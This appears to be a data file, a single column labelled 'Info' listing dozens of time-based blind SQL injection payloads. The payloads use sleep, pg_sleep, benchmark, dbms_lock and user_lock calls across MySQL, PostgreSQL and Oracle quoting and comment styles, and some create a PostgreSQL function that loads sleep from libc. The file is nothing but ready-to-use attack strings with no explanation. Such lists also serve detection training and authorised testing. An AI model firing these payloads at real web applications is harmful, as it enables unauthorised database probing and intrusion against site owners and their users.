Info
) where 7956=7956 or sleep(5)#
')) as gfzb where 7904=7904 begin dbms_lock.sleep(5)  end--
""") as nraw where 7984=7984 and elt(3114=3114,sleep(5))#"
"') and 3824=benchmark(5000000,md5(0x76555642))  end and ('jzlr'='jzlr"
"%"");select benchmark(5000000,md5(0x714e4153))#"
"%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""%""="""
'+(select 'gmpn' where 8137=8137 or sleep(5))#
) as imdt where 6431=6431 begin user_lock.sleep(5)  end--
) where 3979=3979 rlike sleep(5)--
') rlike (select * from (select(sleep(5)))vwyq)#
""") where 7548=7548;select sleep(5)--"
' (select * from (select(sleep(5)))srmq)
"%"")) rlike (select * from (select(sleep(5)))vwyq)#"
' where 2382=2382 (select * from (select(sleep(5)))acdk)#
""") where 6843=6843 or 6793=(select 6793 from pg_sleep(5))--"
""") where 5197=5197 and elt(3114=3114,sleep(5))#"
"'||(select 'aevx' from dual where 9999=9999;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'"
'))) or (select * from (select(sleep(5)))ydpu) and ((('jrpk'='jrpk
'+(select 'jtvq' where 8288=8288 and (select * from (select(sleep(5)))gcrr)#
'))# begin user_lock.sleep(5)  end and ((6874=6874
"%"") or elt(5873=5873,sleep(5))#"
')) (select * from (select(sleep(5)))acdk)#
""" where 6800=6800 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#"
'+(select 'wvqj' where 3709=3709 begin user_lock.sleep(5)  end--
"') where 3476=3476 and elt(1210=1210,sleep(5))--"
%' or (select * from (select(sleep(5)))sddo)#
) where 1527=1527 or 4240=(select 4240 from pg_sleep(5))--
"') and 3824=benchmark(5000000,md5(0x76555642))"
' and 6969=(select 6969 from pg_sleep(5))-- yczq
""");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--"
')) begin user_lock.sleep(5)  end--
""");select pg_sleep(5)--"
""" and sleep(5)#"
"""))) or elt(5873=5873,sleep(5))#"
")) or 8514=benchmark(5000000,md5(0x544d5a4c))#"
"""))) rlike sleep(5) and (((""%""="""
"')) or 8466=benchmark(5000000,md5(0x694a4745)) and (('ossj'='ossj"
""") procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#"
') or sleep(5)#
"' or 8514=benchmark(5000000,md5(0x544d5a4c))#"
%' or 4240=(select 4240 from pg_sleep(5))--
') as jlae where 1650=1650 begin user_lock.sleep(5)  end--
""";begin user_lock.sleep(5); end and ""%""="""
"'||(select 'mzsy' where 4940=4940 or elt(5873=5873,sleep(5))#"
""");(select * from (select(sleep(5)))acdk)#"
'))) select pg_sleep(5)--
"') as mwpp where 6192=6192;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--"
"""))) and 3824=benchmark(5000000,md5(0x76555642)) and (((""pnsz"" like ""pnsz"
' where 4473=4473 and (select * from (select(sleep(5)))gcrr)#
"%"") procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (""%""="""
"%"" and 3824=benchmark(5000000,md5(0x76555642)) and ""%""="""
) as jtfx where 8038=8038 select sleep(5)--
'))) begin user_lock.sleep(5)  end and ((('gqhc'='gqhc
' where 7191=7191 rlike sleep(5)--
') (select * from (select(sleep(5)))srmq) and ('kerg' like 'kerg
')) and sleep(5) and (('jiio' like 'jiio
)) or sleep(5)#
')) as rxxd where 5049=5049 select pg_sleep(5)--
""" where 3990=3990 and 8594=(select 8594 from pg_sleep(5))--"
") procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (1624=1624"
')) and sleep(5) and (('tcwt'='tcwt
') or (select * from (select(sleep(5)))ydpu) and ('zaes'='zaes
"%"") rlike (select * from (select(sleep(5)))sgvo) and (""%""="""
)) as pmff where 6649=6649 begin user_lock.sleep(5)  end--
')) rlike (select * from (select(sleep(5)))sgvo) and (('hqcz'='hqcz
""") rlike (select * from (select(sleep(5)))sgvo) and (""fkmh""=""fkmh"
') (select * from (select(sleep(5)))srmq) and ('pgth'='pgth
' where 5700=5700 select pg_sleep(5)--
"'+(select iaeu where 5509=5509 or 8514=benchmark(5000000,md5(0x544d5a4c))#"
